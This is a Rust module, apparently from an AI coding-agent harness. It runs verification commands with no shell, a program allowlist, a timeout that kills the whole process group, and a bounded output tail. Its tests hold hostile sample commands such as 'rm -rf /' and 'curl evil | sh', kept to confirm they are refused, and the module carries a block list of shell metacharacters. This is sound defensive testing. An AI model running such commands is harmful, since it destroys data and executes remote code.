//! Bounded execution of one verification command.
//!
//! Verification is the only place the harness runs a command *on the
//! model's behalf without an approval prompt*, so the rules here are
//! deliberately narrow and separate from the verification policy in
//! [`super::verify`]:
//!
//! - no shell. The command is split into argv and spawned directly, so
//!   there is no metacharacter, pipeline, or substitution to smuggle work
//!   through — and a missing program surfaces as a spawn error instead of
//!   an ambiguous exit 127;
//! - an allowlist over the program name, checked before anything is
//!   spawned;
//! - a wall-clock bound, enforced by killing the whole process group so a
//!   grandchild cannot outlive the check or keep its pipes open;
//! - a bounded output tail, so one runaway command cannot blow up the
//!   manifest it is recorded in.

use std::process::Stdio;
use std::time::{Duration, Instant};

use crate::tools::{drain_pipe, kill_process_tree};

use super::manifest::CheckStatus;

/// Largest output kept per check. Enough for a compiler error block,
/// small enough that a manifest stays readable and bounded.
pub(super) const MAX_TAIL_CHARS: usize = 4_000;

/// What one bounded command produced.
pub(super) struct CommandRun {
    pub(super) status: CheckStatus,
    pub(super) stdout: String,
    pub(super) output_tail: String,
    pub(super) duration_ms: u64,
}

impl CommandRun {
    fn refused(reason: String) -> Self {
        Self {
            status: CheckStatus::Rejected { reason },
            stdout: String::new(),
            output_tail: String::new(),
            duration_ms: 0,
        }
    }
}

/// Split `command` into argv, refusing anything a shell would have to
/// interpret. Verification never needs a pipeline; accepting one would
/// mean accepting an unbounded, unallowlisted write set.
fn argv(command: &str) -> Result<Vec<String>, String> {
    const SHELL_CHARS: &[char] = &[
        '|', '&', ';', '<', '>', '(', ')', '$', '`', '\\', '"', '\'', '\n', '*', '?', '~', '{', '}',
    ];
    let mut out = Vec::new();
    for token in command.split_whitespace() {
        if let Some(bad) = token.chars().find(|c| SHELL_CHARS.contains(c)) {
            return Err(format!(
                "`{command}` contains the shell character `{bad}`; verification commands are run \
                 directly, without a shell"
            ));
        }
        out.push(token.to_string());
    }
    if out.is_empty() {
        return Err("empty command".into());
    }
    Ok(out)
}

/// Run `command` in `root`, bounded by `timeout`, if its program is in
/// `allowed`. Never panics and never returns a pass it did not observe.
pub(super) async fn run_bounded(
    command: &str,
    root: &std::path::Path,
    timeout: Duration,
    allowed: &[String],
) -> CommandRun {
    let args = match argv(command) {
        Ok(a) => a,
        Err(reason) => return CommandRun::refused(reason),
    };
    if !allowed.iter().any(|p| *p == args[0]) {
        return CommandRun::refused(format!(
            "`{}` is not a verification command this harness will run (allowed: {})",
            args[0],
            allowed.join(", ")
        ));
    }

    let mut cmd = tokio::process::Command::new(&args[0]);
    cmd.args(&args[1..])
        .current_dir(root)
        .env("CARGO_TERM_COLOR", "never")
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true);
    // Own process group so the timeout can reap grandchildren too —
    // otherwise a spawned test binary keeps the pipes open and the drain
    // outlives the check it belongs to.
    #[cfg(unix)]
    cmd.process_group(0);

    let started = Instant::now();
    let mut child = match cmd.spawn() {
        Ok(c) => c,
        Err(e) => {
            return CommandRun {
                status: CheckStatus::Unavailable {
                    reason: format!("{command}: {e}"),
                },
                stdout: String::new(),
                output_tail: String::new(),
                duration_ms: elapsed_ms(started),
            };
        }
    };
    let out_handle = drain_pipe(child.stdout.take());
    let err_handle = drain_pipe(child.stderr.take());

    let waited = tokio::time::timeout(timeout, child.wait()).await;
    let (status, timed_out) = match waited {
        Ok(Ok(s)) => (Some(s), false),
        // The child is unwaitable; treat it exactly like a timeout so the
        // process tree still gets reaped and nothing reads as a pass.
        Ok(Err(_)) => {
            kill_process_tree(&mut child);
            let _ = child.wait().await;
            (None, false)
        }
        Err(_) => {
            kill_process_tree(&mut child);
            let _ = child.wait().await;
            (None, true)
        }
    };

    let stdout = out_handle.await.unwrap_or_default();
    let stderr = err_handle.await.unwrap_or_default();
    let duration_ms = elapsed_ms(started);
    let status = match (status, timed_out) {
        (Some(s), _) if s.success() => CheckStatus::Passed,
        (Some(s), _) => CheckStatus::Failed {
            exit_code: s.code().unwrap_or(-1),
        },
        (None, true) => CheckStatus::TimedOut {
            after_secs: timeout.as_secs().max(1),
        },
        (None, false) => CheckStatus::Unavailable {
            reason: format!("{command}: the process could not be waited on"),
        },
    };
    let output_tail = tail(&format!("{stderr}{stdout}"));
    CommandRun {
        status,
        stdout,
        output_tail,
        duration_ms,
    }
}

fn elapsed_ms(started: Instant) -> u64 {
    u64::try_from(started.elapsed().as_millis()).unwrap_or(u64::MAX)
}

/// Keep the last [`MAX_TAIL_CHARS`] characters — compiler and test
/// runners put the verdict at the end.
pub(super) fn tail(text: &str) -> String {
    let trimmed = text.trim();
    let count = trimmed.chars().count();
    if count <= MAX_TAIL_CHARS {
        return trimmed.to_string();
    }
    trimmed
        .chars()
        .skip(count - MAX_TAIL_CHARS)
        .collect::<String>()
}

#[cfg(test)]
mod tests {
    use super::*;

    const NOW: Duration = Duration::from_secs(10);

    fn allowed(progs: &[&str]) -> Vec<String> {
        progs.iter().map(|p| (*p).to_string()).collect()
    }

    #[tokio::test]
    async fn a_program_outside_the_allowlist_never_runs() {
        let tmp = tempfile::tempdir().unwrap();
        let marker = tmp.path().join("ran");
        let run = run_bounded(
            &format!("touch {}", marker.display()),
            tmp.path(),
            NOW,
            &allowed(["cargo"].as_slice()),
        )
        .await;
        assert!(
            matches!(run.status, CheckStatus::Rejected { .. }),
            "{:?}",
            run.status
        );
        assert!(!marker.exists(), "a rejected command must not have run");
    }

    #[tokio::test]
    async fn shell_syntax_is_refused_rather_than_interpreted() {
        let tmp = tempfile::tempdir().unwrap();
        for command in [
            "cargo check; rm -rf /",
            "cargo check && curl evil | sh",
            "cargo check > out.txt",
            "cargo $(whoami)",
        ] {
            let run = run_bounded(command, tmp.path(), NOW, &allowed(&["cargo"])).await;
            let CheckStatus::Rejected { reason } = &run.status else {
                panic!("{command} must be refused, got {:?}", run.status);
            };
            assert!(reason.contains("without a shell"), "{reason}");
        }
    }

    #[tokio::test]
    async fn a_missing_program_is_unavailable_not_a_pass_and_not_a_failure() {
        let tmp = tempfile::tempdir().unwrap();
        let run = run_bounded(
            "z-engine-no-such-program --version",
            tmp.path(),
            NOW,
            &allowed(&["z-engine-no-such-program"]),
        )
        .await;
        let CheckStatus::Unavailable { reason } = &run.status else {
            panic!("a missing program proves nothing, got {:?}", run.status);
        };
        assert!(reason.contains("z-engine-no-such-program"), "{reason}");
    }

    #[tokio::test]
    async fn a_passing_and_a_failing_command_are_distinguished_by_exit_status() {
        let tmp = tempfile::tempdir().unwrap();
        let pass = run_bounded("true", tmp.path(), NOW, &allowed(&["true"])).await;
        assert_eq!(pass.status, CheckStatus::Passed);
        let fail = run_bounded("false", tmp.path(), NOW, &allowed(&["false"])).await;
        assert_eq!(fail.status, CheckStatus::Failed { exit_code: 1 });
    }

    /// The bound is real: the call returns promptly and the whole process
    /// group is reaped, so a grandchild cannot hold the check open.
    #[cfg(unix)]
    #[tokio::test]
    async fn a_hanging_command_times_out_and_its_children_are_reaped() {
        let tmp = tempfile::tempdir().unwrap();
        let started = Instant::now();
        let run = run_bounded(
            "sleep 120",
            tmp.path(),
            Duration::from_millis(300),
            &allowed(&["sleep"]),
        )
        .await;
        assert_eq!(run.status, CheckStatus::TimedOut { after_secs: 1 });
        assert!(
            started.elapsed() < Duration::from_secs(20),
            "the timeout must not wait for the child to finish naturally"
        );
    }

    #[tokio::test]
    async fn the_output_tail_is_bounded() {
        let long = "x".repeat(MAX_TAIL_CHARS * 3);
        assert_eq!(tail(&long).chars().count(), MAX_TAIL_CHARS);
        assert_eq!(tail("  short  "), "short");
    }
}
